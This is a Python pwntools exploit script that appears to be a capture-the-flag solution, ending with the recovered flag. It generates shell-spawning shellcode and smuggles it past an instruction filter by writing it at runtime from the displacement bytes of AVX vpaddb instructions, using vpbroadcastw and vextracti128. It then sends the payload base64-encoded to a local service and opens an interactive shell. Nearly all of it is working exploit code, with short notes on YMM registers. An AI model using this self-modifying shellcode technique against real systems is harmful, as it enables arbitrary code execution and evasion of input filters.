#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *
import base64

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'python3'
context.terminal = ["tmux", "splitw", "-hb"]
argv = ['server.py']
env = {}

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

def store_const(val):
    asm_lines = [
        # ymm0 = 0
        "vpxor ymm0, ymm0, ymm0",
        # make ymm1 = 1
        "vpxor   ymm1, ymm1, ymm1",
        "vpcmpeqd ymm2, ymm2, ymm2",
        "vpsrlq  ymm1, ymm2, 63"
    ]

    parts = [(val >> (64 * i)) & (2**64-1) for i in range(2)]

    for x in parts:
        print(hex(x))

    for (idx, val) in enumerate(parts):
        reg = f"ymm{2+idx}"
        asm_lines.append(f"vpxor {reg}, {reg}, {reg}")
        for i in reversed(range(64)):
            if val & (1 << i):
                asm_lines.append(f"vpaddq {reg}, {reg}, {reg}")
                asm_lines.append(f"vpaddq {reg}, {reg}, ymm1")
            else:
               asm_lines.append(f"vpaddq {reg}, {reg}, {reg}")

    #asm_lines.append("vpsllq ymm2, ymm2, 64")
    #asm_lines.append("vpaddq ymm0, ymm2, ymm3")

    return "\n".join(asm_lines)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

'''
https://docs.oracle.com/cd/E36784_01/html/E36859/gntae.html#scrolltoc

256-bit YMM registers (ymm0–ymm15 on x86_64).

SIMD - single instruction, multiple data

Data Types: Works on packed integers (8/16/32/64-bit).

Each YMM register can hold and do simultaneous operations (math) on:
    sixteen 16-bit integers (floats dont work with 16 bit)
    eight 32-bit single-precision floating-point numbers / integers or
    four 64-bit double-precision floating-point numbers / integers.

8-bit: vpmovzxbw, vpaddb, etc (byte)
16-bit: vpaddw, vpmullw, etc. (word)
32-bit: vpaddd, vpbroadcastd, (double word)
64-bit: vpaddq, vpbroadcastq, (quadword)

A lane is a fixed-size chunk inside a SIMD register that's processed independently.
'''

io = start(argv, env=env)

sc = asm(shellcraft.sh())
sc = sc.ljust(4-(len(sc)%4), b"\x90")

#print("SC: ", sc.hex())

asm_lines = []
for i in range(0, len(sc), 2):
    # load 16 bit word and broadcast it to all 16 16bit-lanes of ymm0
    # ymm0 = [val]*16
    # +4 since first 4 bytes is instruction, then comes displacement (our sc)
    asm_lines.append(f"vpbroadcastw ymm0, [rip + sc{i} + 4]")
    # extract lower 128 bits from ymm0 and store them at rip + enc +i
    # since we increase offset by 2 each round, we can write sc using 128 bit writes
    asm_lines.append(f"vextracti128 [rip + enc + {i}], ymm0, 0")

asm_lines.append("enc:")
# fill memory with padding add instructions (4 bytes long). This is where we put our shellcode
for i in range(0, len(sc), 4):
    asm_lines.append("vpaddq ymm0, ymm0, ymm0")

# put shellcode byte encoded into an instruction
for i in range(0, len(sc), 2):
    asm_lines.append(f"sc{i}:")
    # encode sc in 2 byte steps instead of 4 to be able to write any sc
    # for 4 byte offsets one might get: 0xb848686a out of range of signed 32bit displacement
    # vpaddb ymm0, ymm1, YMMWORD PTR [rax+0x41414141] = c5 f5 fc 80 41 41 41 41
    asm_lines.append(f"vpaddb ymm0, ymm1, ymmword ptr [rax+{hex(int.from_bytes(sc[i:i+2], "little"))}]")

sc = "\n".join(asm_lines)

print(sc)
sc = asm(sc)

out = base64.b64encode(sc)

io.sendlineafter("encoded):", out)

io.interactive()

# grey{vexed,VEXed_i_tell_you!}